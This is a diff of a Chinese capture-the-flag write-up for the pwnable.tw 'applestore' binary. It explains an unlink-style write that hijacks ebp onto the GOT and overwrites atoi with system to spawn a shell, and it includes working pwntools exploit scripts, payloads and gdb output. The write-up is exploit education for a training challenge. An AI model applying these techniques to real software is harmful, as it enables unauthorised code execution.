@@ -671,7 +671,7 @@ bk[2]=fd
 
 第27个节点的数据是完全可控的，即delete的时候fd，bk。现在我们已知了libc基址，堆段起始地址，栈地址。我们可以做什么？我是否可以只利用泄露出的libc基址，然后将GOT的某项覆盖为libc中system函数的地址呢？例如：当delete执行完之后还要回到handler函数，输入后会执行atoi函数，我希望把`GOT['atoi']`换成`libc_base+libc.symbols['system']`，即把GOT表中的atoi的表项换成libc中的system函数的地址即：
 
-``c
+```c
 * atoi@got = system@libc
 ```
 
@@ -713,6 +713,8 @@ bk[2]=fd
 
 具体来说，部分一的内存空间是由进入函数后栈空间，而且本题可控的栈内存是根据进入函数的ebp寄存器进行寻址。而ebp寄存器会在函数leave时，恢复为栈中之前保存的old_ebp，如果我们能想办法修改old_ebp，则可能在delete函数返回到handler函数后，控制栈的基址。如果我们将栈的基址劫持到GOT表附近，则可能通过输入控制栈，即控制GOT表，最终实现控制流劫持。
 
+#### 劫持ebp
+
 那我们先来尝试劫持ebp到GOT表底部（因为栈是由高地址向低地址增长，ebp是栈底）。我们是通过delete函数满足约束条件的去写old_ebp，为GOT表的地址。首先想到GOT表位于可写的段，所以GOT表+2,+3的地址是data段，也是可写的，并不会崩溃，条件成立。那我们首先需要知道在delete函数返回前old_ebp的地址，泄我们露出的第27个节点的地址，在checkout函数中，距离当时的ebp的偏移为-0x20。根据本题的栈平衡，进入delete函数后，这个第27个节点的地址距离ebp的偏移仍然是-0x20，即old_ebp所在的内存位置为泄露出的栈地址+0x20。所以我们尝试将断点断在泄露完栈地址后的delete函数中，然后触发delete方法看看：
 
 ```python
@@ -747,14 +749,14 @@ payload = 'y\x00'+p32(heap_addr+0x8b0)+p32(1)+p32(0x0804B070)+p32(1)
 action(cart,payload)
 io.recvuntil('27: ')
 stack_addr = u32(io.recv(4)) 
-old_ebp = stack_addr + 0x20
+ebp = stack_addr + 0x20
 
 log.warn('libc_addr: 0x%x' % libc_addr)
 log.warn('heap_addr: 0x%x' % heap_addr)
 log.warn('stack_addr: 0x%x' % stack_addr)
-log.warn('old_ebp: 0x%x' % old_ebp)
+log.warn('ebp: 0x%x' % ebp)
 
-gdb.attach(io,"b * 0x080489C0")
+gdb.attach(io,"b * 0x080489C0 \nc \np $ebp")
 action(delete,"1")
 io.interactive()
 ```
@@ -762,28 +764,159 @@ io.interactive()
 打印结果为：
 
 ```
-[!] libc_addr: 0xf7d0b000
-[!] heap_addr: 0x9e54000
-[!] stack_addr: 0xff8866f8
-[!] old_ebp: 0xff886718
+[!] libc_addr: 0xf7dca000
+[!] heap_addr: 0x8be7000
+[!] stack_addr: 0xff851e78
+[!] ebp: 0xff851e98
 ```
 
-gdb按一下c，然后打印ebp寄存器
+gdb结果：
 
 ```c
 [#0] 0x80489c0 → delete()
 [#1] 0x8048c46 → handler()
 [#2] 0x8048cf5 → main()
 ────────────────────────────────────────────────────────────────────────────────
-gef➤  p $ebp
-$1 = (void *) 0xff886718
+$1 = (void *) 0xff851e98
 ```
 
-可见的确，进入到delete函数中的ebp和在checkout中的ebp是相同的。那么我们便可以劫持ebp到GOT表底部，即`* ebp = `
+可见的确，进入到delete函数中的ebp和在checkout中的ebp是相同的。那么我们便可以劫持ebp到GOT表底部，即`* ebp = 0x0804B044`，然后进行公式计算：
+
+```c
+fd[3]=bk
+bk[2]=fd
+```
+
+```
+令：fd[3] = * ebp , bk = 0x0804B044
+即：fd + 0xc  = ebp, bk = 0x0804B044
+即：fd = ebp - 0xc, bk = 0x0804B044
+
+故：bk[2] = 0x0804B04c，为可写的data段，不会崩溃
+```
+
+所以通过构造`fd = ebp - 0xc, bk = 0x0804B044`的结构体，然后delete，返回到handler函数后，ebp即被劫持到0x0804B040，调试如下：
+
+```python
+from pwn import *
+context(arch='i386',os='linux',log_level='debug')
+myelf = ELF('applestore')
+libc = ELF('../../my_ubuntu32_libc.so')
+io = process(myelf.path)
+# libc = ELF("./libc_32.so.6")
+# io = remote("chall.pwnable.tw",10104)
+
+add = '2';delete='3';cart='4';checkout='5'
+
+def action(num,payload):
+        io.sendlineafter('> ',num)
+        io.sendlineafter('> ',payload)
+for i in range(6):
+        action(add,'1')
+for i in range(20):
+        action(add,'2')
+action(checkout,'y')
+
+payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
+action(cart,payload)
+
+io.recvuntil('27: ')
+libc_addr = u32(io.recv(4))-libc.symbols['puts']
+io.recvuntil('28: ')
+heap_addr = u32(io.recv(4))-0x490
+
+payload = 'y\x00'+p32(heap_addr+0x8b0)+p32(1)+p32(0x0804B070)+p32(1)
+action(cart,payload)
+io.recvuntil('27: ')
+stack_addr = u32(io.recv(4)) 
+ebp = stack_addr + 0x20
+
+for i in range(25):
+        action(delete,'1')
+
+gdb.attach(io,"b * 0x08048C46\nc\np $ebp")
+
+payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(ebp-0xc)+p32(0x0804B044)
+action(delete,payload)
+
+io.interactive()
+```
+
+这里断点我下到了delete函数返回后的一句，然后首先删除了前面25个节点，以便于输入的删除的参数是个位数，然后用0x00截断，使得delete可以正常删除我们的栈上的节点，并且第一个元素指向的地址还是需要是可读的，因为delete函数最后一样会打印iphone被从购物车中移除了，所以这里还用的是`myelf.got['puts']`。观察调试器结果如下：
+
+```bash
+gef➤  p $ebp
+$1 = (void *) 0x804b044
+```
+
+果然ebp已经劫持了
+
+#### 覆盖GOT表
+
+那么我们现在回到了handler函数，handler函数本身一样接受一个输入，并保存到栈上，当前栈基址即ebp已经是GOT表尾地址，故已经可以覆盖部分GOT表内容了，即ebp-0x22到ebp-0xc中间的内容
+
+```c
+unsigned int handler()
+{
+  char nptr; // [esp+16h] [ebp-22h]
+  unsigned int v2; // [esp+2Ch] [ebp-Ch]
+
+  v2 = __readgsdword(0x14u);
+  while ( 1 )
+  {
+    printf("> ");
+    fflush(stdout);
+    my_read(&nptr, 0x15u);
+    switch ( atoi(&nptr) )
+```
+
+不过我们可以看到，handler函数用到了atoi函数，其参数为ebp-0x22处的内存地址，并且atoi这个函数，在GOT表的尾部，那么我们其实可以劫持ebp的时候在往下一点，然后更优雅的劫持atoi的GOT表项为system函数，&nptr为我们可控的第一个字节的地址。所以我们可以构造如下payload：
+
+![image](https://xuanxuanblingbling.github.io/assets/pic/applestore/got.png)
+
+即构造进入hander后的ebp-0x22为`GOT['asprintf']`，即在delete函数中的满足约束：`*ebp = GOT['asprintf'] + 0x22`，故有计算：
+
+```c
+fd[3]=bk
+bk[2]=fd
+```
+
+```
+(第一种）
+令：fd[3] = * ebp , bk = GOT['asprintf'] + 0x22
+即：fd + 0xc  = ebp, bk = GOT['asprintf'] + 0x22
+即：fd = ebp - 0xc, bk = GOT['asprintf'] + 0x22
+
+故：bk[2] = GOT['asprintf'] + 0x22 + 0x8 = GOT['asprintf'] + 0x2a，位于bss段，仍然可写
 
 
+(第二种）
+令：bk[2] = * ebp , fd = GOT['asprintf'] + 0x22
+即：bk + 0x8  = ebp, fd = GOT['asprintf'] + 0x22
+即：bk = ebp - 0x8, fd = GOT['asprintf'] + 0x22
 
+故：fd[3] = GOT['asprintf'] + 0x22 + 0xc = GOT['asprintf'] + 0x2e，位于bss段，仍然可写
 
+(总结)
+fd = ebp - 0xc, bk = GOT['asprintf'] + 0x22
+bk = ebp - 0x8, fd = GOT['asprintf'] + 0x22
+```
+
+故构造以下payload均可：
+
+```python
+payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(ebp-0xc)+p32(myelf.got['asprintf']+0x22)
+payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(myelf.got['asprintf']+0x22)+p32(ebp-0x8)
+```
+
+然后即可以按上图覆盖GOT表，以下payload均可：
+
+```python
+payload = 'sh\x00\x00'+p32(libc_addr+libc.symbols['system'])
+payload = '$0\x00\x00'+p32(libc_addr+libc.symbols['system'])
+```
+
+`system("$0")和system("sh")`均可getshell，因为利用system函数执行是可以利用shell的环境变量的，最终完整exp如下：
 
 ### 完整exp
 
@@ -813,17 +946,14 @@ heap_addr = u32(io.recv(4))-0x490
 payload = 'y\x00'+p32(heap_addr+0x8b0)+p32(1)+p32(0x0804B070)+p32(1)
 action(cart,payload)
 io.recvuntil('27: ')
-stack_addr = u32(io.recv(4))+0x20
+ebp = u32(io.recv(4))+0x20
 for i in range(25):
         action(delete,'1')
-#payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(stack_addr-0xc)+p32(myelf.got['asprintf']+0x22)
-payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(myelf.got['asprintf']+0x22)+p32(stack_addr-0x8)
+#payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(ebp-0xc)+p32(myelf.got['asprintf']+0x22)
+payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(myelf.got['asprintf']+0x22)+p32(ebp-0x8)
 action(delete,payload)
 payload = 'sh\x00\x00'+p32(libc_addr+libc.symbols['system'])
 io.sendlineafter("> ",payload)
-log.warn('libc_addr: %x' % libc_addr)
-log.debug('heap_addr: %x' % heap_addr)
-log.debug('stack_addr: %x' % stack_addr)
 
 # gdb.attach(io,"b * 0x8048beb")
 io.interactive()
